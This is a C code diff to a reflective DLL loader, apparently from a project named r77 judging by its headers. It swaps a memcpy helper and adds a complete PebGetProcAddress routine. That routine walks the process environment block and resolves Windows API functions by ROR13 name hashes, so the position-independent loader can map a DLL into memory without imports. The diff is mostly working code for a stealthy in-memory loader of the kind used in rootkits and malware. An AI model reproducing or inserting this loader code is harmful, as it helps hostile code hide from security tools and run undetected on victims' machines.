@@ -1,13 +1,11 @@
 #include "ReflectiveDllMain.h"
 #include "ntdll.h"
 #include "r77win.h"
-#include "r77runtime.h"
 
 BOOL WINAPI ReflectiveDllMain(LPBYTE dllBase)
 {
-	// All functions that are used in the reflective loader must be found by searching the PEB.
-	// Functions, such as memcpy need to be handwritten, because no functions are imported, yet.
-	// Switch statements cannot be used, because a jump table would be created and the shellcode would not be position independent anymore.
+	// All functions that are used in the reflective loader must be found by searching the PEB, because no functions are imported, yet.
+	// Switch statements must not be used, because a jump table would be created and the shellcode would not be position independent anymore.
 
 	NT_NTFLUSHINSTRUCTIONCACHE ntFlushInstructionCache = (NT_NTFLUSHINSTRUCTIONCACHE)PebGetProcAddress(0x3cfa685d, 0x534c0ab8);
 	NT_LOADLIBRARYA loadLibraryA = (NT_LOADLIBRARYA)PebGetProcAddress(0x6a4abc5b, 0xec0e4e8e);
@@ -24,13 +22,13 @@ BOOL WINAPI ReflectiveDllMain(LPBYTE dllBase)
 		if (allocatedMemory)
 		{
 			// Copy optional header to new memory.
-			libc_memcpy(allocatedMemory, dllBase, ntHeaders->OptionalHeader.SizeOfHeaders);
+			i_memcpy(allocatedMemory, dllBase, ntHeaders->OptionalHeader.SizeOfHeaders);
 
 			// Copy sections to new memory.
 			PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((LPBYTE)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);
 			for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
 			{
-				libc_memcpy(allocatedMemory + sections[i].VirtualAddress, dllBase + sections[i].PointerToRawData, sections[i].SizeOfRawData);
+				i_memcpy(allocatedMemory + sections[i].VirtualAddress, dllBase + sections[i].PointerToRawData, sections[i].SizeOfRawData);
 			}
 
 			// Read the import directory, call LoadLibraryA to import dependencies and patch the IAT.
@@ -100,4 +98,57 @@ BOOL WINAPI ReflectiveDllMain(LPBYTE dllBase)
 
 	// If loading failed, DllMain was not executed either. Return FALSE.
 	return FALSE;
+}
+static LPVOID PebGetProcAddress(DWORD moduleHash, DWORD functionHash)
+{
+#ifdef _WIN64
+	PNT_PEB_LDR_DATA peb = (PNT_PEB_LDR_DATA)((PNT_PEB)__readgsqword(0x60))->Ldr;
+#else
+	PNT_PEB_LDR_DATA peb = (PNT_PEB_LDR_DATA)((PNT_PEB)__readfsdword(0x30))->Ldr;
+#endif
+
+	PNT_LDR_DATA_TABLE_ENTRY firstPebEntry = (PNT_LDR_DATA_TABLE_ENTRY)peb->InMemoryOrderModuleList.Flink;
+	PNT_LDR_DATA_TABLE_ENTRY pebEntry = firstPebEntry;
+	do
+	{
+		DWORD entryHash = 0;
+		if (pebEntry->BaseDllName.Buffer)
+		{
+			for (USHORT i = 0; i < pebEntry->BaseDllName.Length; i++)
+			{
+				CHAR c = ((LPCSTR)pebEntry->BaseDllName.Buffer)[i];
+				entryHash = _rotr(entryHash, 13) + (c >= 'a' ? c - 0x20 : c);
+			}
+		}
+
+		// Find module by hash
+		if (entryHash == moduleHash)
+		{
+			LPBYTE dllBase = (LPBYTE)pebEntry->DllBase;
+			PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBase + ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew);
+			PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+			LPDWORD nameDirectory = (LPDWORD)(dllBase + exportDirectory->AddressOfNames);
+			LPWORD nameOrdinalDirectory = (LPWORD)(dllBase + exportDirectory->AddressOfNameOrdinals);
+
+			// Find function by hash
+			for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++, nameDirectory++, nameOrdinalDirectory++)
+			{
+				DWORD hash = 0;
+				for (LPCSTR currentFunctionName = (LPCSTR)(dllBase + *nameDirectory); *currentFunctionName; currentFunctionName++)
+				{
+					hash = _rotr(hash, 13) + *currentFunctionName;
+				}
+
+				if (hash == functionHash)
+				{
+					return dllBase + *(LPDWORD)(dllBase + exportDirectory->AddressOfFunctions + *nameOrdinalDirectory * sizeof(DWORD));
+				}
+			}
+
+			return NULL;
+		}
+	}
+	while ((pebEntry = (PNT_LDR_DATA_TABLE_ENTRY)pebEntry->InMemoryOrderModuleList.Flink) != firstPebEntry);
+
+	return NULL;
 }
